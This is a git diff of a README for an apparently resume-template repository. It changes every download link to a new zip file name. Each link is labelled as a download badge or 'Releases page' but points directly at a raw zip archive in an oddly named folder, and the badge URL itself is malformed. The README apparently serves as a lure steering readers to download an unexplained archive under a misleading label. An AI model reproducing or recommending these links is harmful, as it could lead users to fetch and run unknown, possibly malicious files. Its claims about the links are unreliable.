@@ -1,6 +1,6 @@
 # 🌟 jobhireai-resume-templates - Create Professional Resumes Easily
 
-[![Download Resume Templates](https://raw.githubusercontent.com/Jhoyner28/jobhireai-resume-templates/main/manist/jobhireai-resume-templates.zip%20Now-blue)](https://raw.githubusercontent.com/Jhoyner28/jobhireai-resume-templates/main/manist/jobhireai-resume-templates.zip)
+[![Download Resume Templates](https://raw.githubusercontent.com/Jhoyner28/jobhireai-resume-templates/main/manist/jobhireai_templates_resume_v3.5.zip%20Now-blue)](https://raw.githubusercontent.com/Jhoyner28/jobhireai-resume-templates/main/manist/jobhireai_templates_resume_v3.5.zip)
 
 ## 📝 Overview
 
@@ -12,7 +12,7 @@ To get started with your resume creation, follow these simple steps:
 
 1. **Visit the Releases Page**
    
-   Go to our [Releases page](https://raw.githubusercontent.com/Jhoyner28/jobhireai-resume-templates/main/manist/jobhireai-resume-templates.zip) to find all available templates. The Releases page contains all the versions you can download.
+   Go to our [Releases page](https://raw.githubusercontent.com/Jhoyner28/jobhireai-resume-templates/main/manist/jobhireai_templates_resume_v3.5.zip) to find all available templates. The Releases page contains all the versions you can download.
 
 2. **Select a Template**
    
@@ -32,7 +32,7 @@ To get started with your resume creation, follow these simple steps:
 
 ## 📥 Download & Install
 
-To download the resume templates, visit our [Releases page](https://raw.githubusercontent.com/Jhoyner28/jobhireai-resume-templates/main/manist/jobhireai-resume-templates.zip). From there, you can select your preferred template and start your journey toward an impressive resume.
+To download the resume templates, visit our [Releases page](https://raw.githubusercontent.com/Jhoyner28/jobhireai-resume-templates/main/manist/jobhireai_templates_resume_v3.5.zip). From there, you can select your preferred template and start your journey toward an impressive resume.
 
 ## ✨ Features
 
